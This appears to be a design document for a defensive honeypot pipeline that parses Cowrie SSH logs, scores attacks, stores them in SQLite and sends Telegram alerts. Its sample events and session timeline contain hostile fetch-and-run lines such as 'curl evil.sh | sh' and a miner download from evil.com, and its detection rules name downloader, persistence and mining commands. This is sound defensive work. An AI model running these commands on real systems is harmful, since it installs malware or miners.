# Honeypot Intelligence Pipeline - Architecture Design

## Document Version: 1.0
## Date: 2026-02-26
## Author: Subagent Phase 2

---

## 1. Executive Summary

This document defines the architecture for an automated honeypot intelligence pipeline that processes Cowrie SSH honeypot logs from CT100, extracts actionable threat intelligence, and delivers real-time alerts via Telegram.

---

## 2. Pipeline Architecture Overview

### 2.1 High-Level Data Flow

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   COWRIE    │────▶│    PARSE     │────▶│   ANALYZE   │────▶│    STORE    │────▶│    ALERT    │
│   (CT100)   │     │   (Gateway)  │     │  (Gateway)  │     │  (Gateway)  │     │  (Gateway)  │
│             │     │              │     │             │     │             │     │             │
│ cowrie.json │     │ JSON → Obj   │     │  Detection  │     │  SQLite/    │     │  Telegram   │
│  (source)   │     │ Validation   │     │   Scoring   │     │   JSONL     │     │   Bot API   │
└─────────────┘     └──────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
       │                    │                   │                   │                   │
       │              ┌─────┴─────┐       ┌─────┴─────┐       ┌─────┴─────┐             │
       │              │           │       │           │       │           │             │
       │         ┌────┴────┐ ┌────┴────┐ ┌┴─────────┐┌┴┐ ┌────┴────┐ ┌────┴────┐        │
       │         │FileWatch│ │ Error   │ │IP Rep   ││ │ │Threat DB│ │ Session │        │
       │         │  (py)   │ │ Handler │ │Analysis ││ │ │(SQLite) │ │  Store  │        │
       │         └─────────┘ └─────────┘ └─────────┘└─┘ └─────────┘ └─────────┘        │
       │                                                                                 │
   Log Source                                                                      Alert Target
```

### 2.2 Pipeline Stages Detail

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                           STAGE 1: LOG INGESTION (Source: CT100)                            │
├─────────────────────────────────────────────────────────────────────────────────────────────┤
│ • Source File: /var/log/cowrie/cowrie.json                                                   │
│ • Transport: SSH tail -f with log shipping OR periodic rsync                                │
│ • Trigger: FileWatcher on Gateway detects new lines                                         │
│ • Format: NDJSON (Newline-Delimited JSON)                                                   │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
                                           │
                                           ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                           STAGE 2: PARSE (Gateway Node)                                     │
├─────────────────────────────────────────────────────────────────────────────────────────────┤
│ • Input: Raw JSON lines from Cowrie                                                         │
│ • Process: JSON deserialization → Event objects                                             │
│ • Validation: Schema validation against known event types                                   │
│ • Output: Structured Python dicts with normalized fields                                    │
│ • Error Handling: Invalid JSON → /root/honeypot-intel/quarantine/parse-errors.log          │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
                                           │
                                           ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                           STAGE 3: ANALYZE (Gateway Node)                                   │
├─────────────────────────────────────────────────────────────────────────────────────────────┤
│ • Pattern Detection: Regex signatures for attack types                                      │
│ • IP Reputation: Check against known threat feeds (optional enrichment)                     │
│ • Session Correlation: Link events by session ID                                            │
│ • Threat Scoring: Assign severity based on behavior patterns                                │
│ • GeoIP Lookup: Enrich with geographic data (MaxMind/GeoLite2)                              │
│ • Output: Analyzed events with threat metadata                                              │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
                                           │
                                           ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                           STAGE 4: STORE (Gateway Node)                                     │
├─────────────────────────────────────────────────────────────────────────────────────────────┤
│ • Primary: SQLite database (/root/honeypot-intel/honeypot.db)                              │
│ • Archive: JSONL files by date (/root/honeypot-intel/archive/YYYY-MM-DD.jsonl)            │
│ • Sessions: Individual session summaries                                                    │
│ • Stats: Hourly/daily aggregation tables                                                    │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
                                           │
                                           ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                           STAGE 5: ALERT (Gateway → Telegram)                               │
├─────────────────────────────────────────────────────────────────────────────────────────────┤
│ • Trigger: High-severity events OR threshold-based batch alerts                             │
│ • Format: Compact Markdown tables optimized for mobile viewing                              │
│ • Rate Limiting: Max 1 alert per 30 seconds, batching when needed                           │
│ • Delivery: Telegram Bot API via python-telegram-bot                                        │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Integration Points

### 3.1 Component Inventory

| Component | Location | Technology | Purpose |
|-----------|----------|------------|---------|
| **Cowrie Honeypot** | CT100 (192.168.1.100) | Python/SSH Honeypot | Attack capture source |
| **Log File** | CT100:/var/log/cowrie/cowrie.json | NDJSON | Raw event stream |
| **File Watcher** | Gateway (OpenClaw host) | Python/watchdog | Log ingestion trigger |
| **Processing Engine** | Gateway | Python 3.11+ | Parse/Analyze/Store |
| **Database** | Gateway | SQLite 3.40+ | Structured storage |
| **Alert Dispatcher** | Gateway | python-telegram-bot | Telegram delivery |
| **Telegram Bot** | Cloud (t.me/...) | Bot API | Alert destination |

### 3.2 Network Architecture

```
                              INTERNET
                                 │
                                 ▼ attackers
                    ┌────────────────────────┐
                    │    CT100 (Honeypot)    │◄──── SSH attacks
                    │   192.168.1.100:2222   │
                    │      Cowrie SSH        │
                    └───────────┬────────────┘
                                │ writes
                                ▼
                    /var/log/cowrie/cowrie.json
                                │
                ┌───────────────┼───────────────┐
                │               │               │
                ▼               ▼               ▼
        ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
        │   Log Ship   │ │   SSH Tail   │ │   Rsync    │
        │  (rsyslog)   │ │     -f       │ │ (periodic) │
        └──────┬───────┘ └──────┬───────┘ └──────┬───────┘
               │                │                │
               └────────────────┼────────────────┘
                                │ SSH/Local
                                ▼
                    ┌────────────────────────┐
                    │   GATEWAY (OpenClaw)   │
                    │    Pipeline Engine     │
                    │  /root/honeypot-intel/ │
                    │                        │
                    │  ┌──────────────────┐  │
                    │  │   Pipeline Core  │  │
                    │  │  - parser.py     │  │
                    │  │  - analyzer.py   │  │
                    │  │  - storage.py    │  │
                    │  │  - alerter.py    │  │
                    │  └──────────────────┘  │
                    │  ┌──────────────────┐  │
                    │  │   SQLite DB      │  │
                    │  │  honeypot.db     │  │
                    │  └──────────────────┘  │
                    └───────────┬────────────┘
                                │ HTTPS
                                ▼
                         ┌─────────────┐
                         │  Telegram   │
                         │   Cloud     │
                         │   API       │
                         └──────┬──────┘
                                │
                                ▼
                         ┌─────────────┐
                         │   Admin     │
                         │   Phone     │
                         └─────────────┘
```

### 3.3 Data Flow Specifications

| Flow | Protocol | Frequency | Direction | Authentication |
|------|----------|-----------|-----------|----------------|
| Log Stream | SSH/SCP | Real-time | CT100 → Gateway | SSH key-based |
| Processing | Local | Event-driven | Internal only | N/A |
| Storage | SQLite (local) | Real-time | Write-only | File perms 600 |
| Alerts | HTTPS/TLS | Real-time | Gateway → Telegram | Bot Token |

---

## 4. Schema Design

### 4.1 Raw Event Schema (Cowrie Output)

Cowrie produces NDJSON with these primary event types:

```json
{
  "eventid": "cowrie.login.failed",
  "username": "root",
  "password": "123456",
  "timestamp": "2024-01-15T10:30:45.123456Z",
  "src_ip": "192.0.2.100",
  "session": "a1b2c3d4e5f6",
  "sensor": "ct100"
}
```

**Event Types to Handle:**

| Event ID | Description | Priority |
|----------|-------------|----------|
| `cowrie.session.connect` | New connection established | LOW |
| `cowrie.login.failed` | Failed authentication attempt | MEDIUM |
| `cowrie.login.success` | Successful authentication (CRITICAL) | HIGH |
| `cowrie.command.input` | Command entered by attacker | HIGH |
| `cowrie.command.failed` | Failed command execution | MEDIUM |
| `cowrie.session.file_download` | File downloaded by attacker | HIGH |
| `cowrie.session.file_upload` | File uploaded by attacker | HIGH |
| `cowrie.client.version` | SSH client version string | LOW |
| `cowrie.session.closed` | Session ended | LOW |
| `cowrie.log.closed` | Log rotation marker | LOW |
| `cowrie.direct-tcpip.request` | Port forwarding attempt | MEDIUM |
| `cowrie.shell.session` | Shell session started | HIGH |

### 4.2 Normalized Schema (Pipeline Internal)

```python
{
    # Core Identification
    "event_id": "uuid-v4",           # Pipeline-assigned UUID
    "raw_event_id": "cowrie.login.failed",  # Original Cowrie eventid
    "session_id": "a1b2c3d4e5f6",    # Cowrie session identifier
    
    # Temporal
    "timestamp": "2024-01-15T10:30:45.123456Z",
    "received_at": "2024-01-15T10:30:46.000000Z",
    
    # Network
    "src_ip": "192.0.2.100",
    "src_port": 54321,
    "dst_ip": "192.168.1.100",
    "dst_port": 2222,
    
    # Attack Context
    "attack_type": "brute_force",    # Classified attack category
    "severity": "medium",            # low/medium/high/critical
    "confidence": 0.85,              # Detection confidence 0.0-1.0
    
    # Payload (event-specific)
    "payload": {
        "username": "root",
        "password": "[REDACTED]",    # Store hash only
        "command": "curl evil.sh | sh",
        "file_url": "http://evil.com/payload.bin",
        "client_version": "SSH-2.0-OpenSSH_8.2"
    },
    
    # Enrichment
    "enrichment": {
        "geoip": {
            "country": "CN",
            "city": "Beijing",
            "asn": "AS4134",
            "isp": "China Telecom"
        },
        "threat_intel": {
            "known_malicious": false,
            "blocklist_hits": [],
            "reputation_score": 0.3
        }
    },
    
    # Processing Metadata
    "processed_at": "2024-01-15T10:30:46.500000Z",
    "pipeline_version": "1.0.0"
}
```

### 4.3 Database Schema (SQLite)

```sql
-- Main events table
CREATE TABLE events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_uuid TEXT UNIQUE NOT NULL,
    raw_event_id TEXT NOT NULL,
    session_id TEXT NOT NULL,
    timestamp DATETIME NOT NULL,
    received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    src_ip TEXT NOT NULL,
    src_port INTEGER,
    dst_port INTEGER,
    attack_type TEXT NOT NULL,
    severity TEXT NOT NULL CHECK(severity IN ('low', 'medium', 'high', 'critical')),
    confidence REAL CHECK(confidence >= 0 AND confidence <= 1),
    payload_json TEXT,  -- JSON blob of event-specific data
    geo_country TEXT,
    geo_city TEXT,
    geo_asn TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Sessions summary table
CREATE TABLE sessions (
    session_id TEXT PRIMARY KEY,
    src_ip TEXT NOT NULL,
    start_time DATETIME NOT NULL,
    end_time DATETIME,
    duration_seconds INTEGER,
    login_attempts INTEGER DEFAULT 0,
    success_login BOOLEAN DEFAULT FALSE,
    commands_count INTEGER DEFAULT 0,
    files_downloaded INTEGER DEFAULT 0,
    files_uploaded INTEGER DEFAULT 0,
    session_summary TEXT,  -- JSON of key activities
    max_severity TEXT,
    closed BOOLEAN DEFAULT FALSE
);

-- Attackers/IPs table (aggregated)
CREATE TABLE attackers (
    src_ip TEXT PRIMARY KEY,
    first_seen DATETIME NOT NULL,
    last_seen DATETIME NOT NULL,
    total_sessions INTEGER DEFAULT 0,
    total_events INTEGER DEFAULT 0,
    successful_logins INTEGER DEFAULT 0,
    failed_logins INTEGER DEFAULT 0,
    commands_executed INTEGER DEFAULT 0,
    files_downloaded INTEGER DEFAULT 0,
    country TEXT,
    asn TEXT,
    current_threat_level TEXT,
    notes TEXT
);

-- Alert history
CREATE TABLE alerts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    alert_uuid TEXT UNIQUE NOT NULL,
    triggered_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    severity TEXT NOT NULL,
    alert_type TEXT NOT NULL,  -- 'immediate' or 'digest'
    event_uuids TEXT,  -- JSON array of related event UUIDs
    message_text TEXT,
    telegram_message_id INTEGER,
    delivered BOOLEAN DEFAULT FALSE,
    delivery_error TEXT
);

-- Indices for performance
CREATE INDEX idx_events_timestamp ON events(timestamp);
CREATE INDEX idx_events_src_ip ON events(src_ip);
CREATE INDEX idx_events_session ON events(session_id);
CREATE INDEX idx_events_severity ON events(severity);
CREATE INDEX idx_sessions_src_ip ON sessions(src_ip);
CREATE INDEX idx_attackers_last_seen ON attackers(last_seen);
```

### 4.4 Pattern Detection Rules

| Pattern ID | Name | Detection Logic | Severity |
|------------|------|-----------------|----------|
| `BRUTE_FORCE_001` | Rapid Login Attempts | ≥5 failed logins from same IP in 60s | MEDIUM |
| `BRUTE_FORCE_002` | Distributed Brute Force | ≥3 failed logins for same user from different IPs | HIGH |
| `CRED_STUFFING_001` | Credential Stuffing | ≥10 unique username attempts from same IP | MEDIUM |
| `SUCCESS_LOGIN_001` | Successful Breach | Any successful login | CRITICAL |
| `RECON_001` | System Enumeration | Commands: uname, whoami, id, cat /etc/passwd | LOW |
| `RECON_002` | Network Enumeration | Commands: ifconfig, netstat, ss, ip addr | MEDIUM |
| `MALWARE_001` | Downloader Behavior | curl/wget fetching executables | HIGH |
| `MALWARE_002` | Suspicious Download | Download from raw IP URL | HIGH |
| "PERSISTENCE_001" | Backdoor Attempt | Commands adding SSH keys, cron jobs | CRITICAL |
| "PRIVESC_001" | Privilege Escalation | sudo, su, exploit commands | HIGH |
| "CRYPTO_001" | Crypto Mining | Commands: xmrig, minerd, pool URLs | HIGH |
| "LATERAL_001" | Lateral Movement | ssh, scp, nmap internal ranges | HIGH |

### 4.5 Severity Scoring Matrix

| Event Type | Base Severity | Adjustments | Max |
|------------|---------------|-------------|-----|
| Connection | LOW | +1 if known malicious IP | MEDIUM |
| Failed Login | LOW | +1 per 5 attempts in 1 min | HIGH |
| Success Login | CRITICAL | — | CRITICAL |
| Command | LOW | Varies by command pattern | CRITICAL |
| File Download | MEDIUM | +1 if binary, +1 if direct IP | CRITICAL |
| File Upload | HIGH | +1 if executable | CRITICAL |

---

## 5. Alert Format Specification

### 5.1 Immediate Alert Format (High/Critical Events)

**Trigger:** Single critical event OR high-severity pattern match

```markdown
🚨 *HONEYPOT ALERT: CRITICAL*

┌─────────────────────────────────────────┐
│ 🔴 SUCCESSFUL LOGIN DETECTED            │
├─────────────────────────────────────────┤
│ Time:     2024-01-15 10:32:15 UTC      │
│ Source:   192.0.2.100:54321            │
│ Geo:      🇨🇳 Beijing, CN (AS4134)      │
│ Session:  a1b2c3d4                     │
│ Credentials: root / ********           │
└─────────────────────────────────────────┘

*Immediate Action Recommended*
Check CT100 session: `docker logs cowrie --tail 50`
```

### 5.2 Batch/Digest Alert Format

**Trigger:** Every 5 minutes OR 10 medium+ events accumulated

```markdown
📊 *Honeypot Activity Digest*
*Last 5 minutes | 2024-01-15 10:35 UTC*

```
┌────────────┬────────┬──────────────────────┐
│ Severity   │ Count  │ Top Sources          │
├────────────┼────────┼──────────────────────┤
│ 🔴 Critical│ 0      │ —                    │
│ 🟠 High    │ 2      │ 198.51.100.50 (US)   │
│ 🟡 Medium  │ 8      │ 192.0.2.100 (CN)     │
│ 🔵 Low     │ 15     │ 203.0.113.25 (RU)    │
└────────────┴────────┴──────────────────────┘
```

*Notable Events:*
• `198.51.100.50` - Malware download attempt (wget)
• `192.0.2.100` - Brute force campaign (12 attempts)

[View Dashboard](http://internal.dashboard)
```

### 5.3 Session Summary Alert

**Trigger:** Session closed with interesting activity

```markdown
📋 *Session Closed: a1b2c3d4*

```
┌─────────────┬─────────────────────────────┐
│ Duration    │ 4m 32s                      │
│ Source      │ 192.0.2.100 (🇨🇳 CN)         │
│ Logins      │ 15 failed → 1 success ⚠️    │
│ Commands    │ 8 executed                  │
│ Downloads   │ 2 files                     │
└─────────────┴─────────────────────────────┘
```

*Command Timeline:*
```
[10:30:45] uname -a
[10:31:02] cat /etc/passwd
[10:31:15] wget http://evil.com/miner.sh
[10:31:45] chmod +x miner.sh && ./miner.sh
[10:32:10] curl -sL http://192.168.1.50/botnet | bash
```

*Files Downloaded:*
• `http://evil.com/miner.sh` (SHA256: a1b2...)
• `http://192.168.1.50/botnet` (SHA256: c3d4...)
```

### 5.4 Alert Rate Limiting Rules

| Scenario | Action | Cooldown |
|----------|--------|----------|
| Same IP, same attack type | Aggregate into digest | 5 min |
| Critical event | Immediate alert | None |
| High event rate (>10/min) | Switch to digest mode | 10 min |
| Repeated identical alert | Suppress duplicates | 15 min |
| System startup burst | Queue and batch | 2 min |

---

## 6. File Structure

```
/root/honeypot-intel/
├── pipeline-design.md          # This document
├── config/
│   ├── pipeline.yaml           # Main configuration
│   ├── patterns.yaml           # Detection patterns
│   └── telegram.conf           # Bot credentials (600 perms)
├── src/
│   ├── __init__.py
│   ├── main.py                 # Pipeline entry point
│   ├── watcher.py              # File watch/log tail
│   ├── parser.py               # JSON → normalized events
│   ├── analyzer.py             # Threat detection engine
│   ├── storage.py              # Database operations
│   ├── alerter.py              # Telegram dispatcher
│   └── models.py               # Data classes
├── data/
│   ├── honeypot.db             # SQLite database
│   ├── geoip/
│   │   └── GeoLite2-City.mmdb  # MaxMind database
│   └── blocklists/             # Threat intel feeds
├── archive/
│   ├── 2024/
│   │   ├── 01/
│   │   │   ├── 15.jsonl
│   │   │   └── 16.jsonl
│   └── current.jsonl           # Today's events
├── quarantine/
│   └── parse-errors.log        # Failed parsing attempts
├── logs/
│   └── pipeline.log            # Pipeline operational logs
└── scripts/
    ├── install.sh              # Setup script
    ├── upgrade.sh              # Version upgrade
    └── backup.sh               # Database backup
```

---

## 7. Operational Specifications

### 7.1 Performance Targets

| Metric | Target | Notes |
|--------|--------|-------|
| Event Processing Latency | <500ms | End-to-end from log write to alert |
| Throughput | >1000 events/sec | Sufficient for high-volume attacks |
| Database Size | <10GB/year | With automated archival |
| Alert Delivery | <2s | Telegram API dependent |
| Uptime | 99.9% | Auto-restart on failure |

### 7.2 Security Considerations

1. **Credential Handling**: Passwords stored as SHA256 hashes only
2. **Database Permissions**: SQLite file mode 600 (owner rw only)
3. **Telegram Token**: Stored in separate config file, not in code
4. **Log Sanitization**: Raw logs never forwarded, only processed summaries
5. **Isolation**: Pipeline runs as dedicated user, chroot optional

### 7.3 Error Handling Strategy

| Failure Mode | Response | Recovery |
|--------------|----------|----------|
| Parse Error | Log to quarantine, continue | Manual review queue |
| DB Write Error | Buffer in memory, retry | Alert admin if persistent |
| Telegram API Error | Queue alerts, exponential backoff | Auto-retry 5x |
| CT100 Connection Lost | Poll for reconnection | Alert after 5 min |
| Disk Full | Stop accepting new events, alert | Manual intervention |

---

## 8. Implementation Phases

### Phase 2A: Core Pipeline (This Phase)
- [ ] File watcher implementation
- [ ] JSON parser with schema validation
- [ ] SQLite storage layer
- [ ] Basic Telegram alerts

### Phase 2B: Enrichment
- [ ] GeoIP lookup integration
- [ ] Pattern detection engine
- [ ] Session correlation
- [ ] Threat intelligence feeds

### Phase 2C: Polish
- [ ] Dashboard/API
- [ ] Alert tuning
- [ ] Automated backups
- [ ] Documentation

---

## 9. Configuration Example

```yaml
# pipeline.yaml
pipeline:
  version: "1.0.0"
  
  input:
    source: "ct100"
    method: "ssh_tail"  # or "rsync", "syslog"
    path: "/var/log/cowrie/cowrie.json"
    poll_interval: 1.0
  
  processing:
    batch_size: 100
    max_latency: 5.0
    worker_threads: 2
  
  detection:
    enabled_patterns:
      - brute_force
      - credential_stuffing
      - malware_download
      - persistence_attempt
    severity_threshold: "medium"
  
  storage:
    database: "/root/honeypot-intel/data/honeypot.db"
    archive_dir: "/root/honeypot-intel/archive"
    retention_days: 90
  
  alerting:
    telegram:
      enabled: true
      bot_token: "${TELEGRAM_BOT_TOKEN}"
      chat_id: "${TELEGRAM_CHAT_ID}"
      rate_limit: 30  # seconds between alerts
      digest_interval: 300  # seconds
    
  geoip:
    enabled: true
    database: "/root/honeypot-intel/data/geoip/GeoLite2-City.mmdb"
```

---

## 10. Success Criteria

The pipeline is considered successfully implemented when:

1. ✅ Events from CT100 Cowrie appear in SQLite within 1 second
2. ✅ Critical events trigger Telegram alerts within 2 seconds
3. ✅ All events are archived with no data loss
4. ✅ Pattern detection correctly identifies attack types
5. ✅ No duplicate alerts for same attack pattern within cooldown
6. ✅ Pipeline auto-recovers from CT100 connection interruptions
7. ✅ Database remains under 10GB with 90-day retention

---

*End of Document*
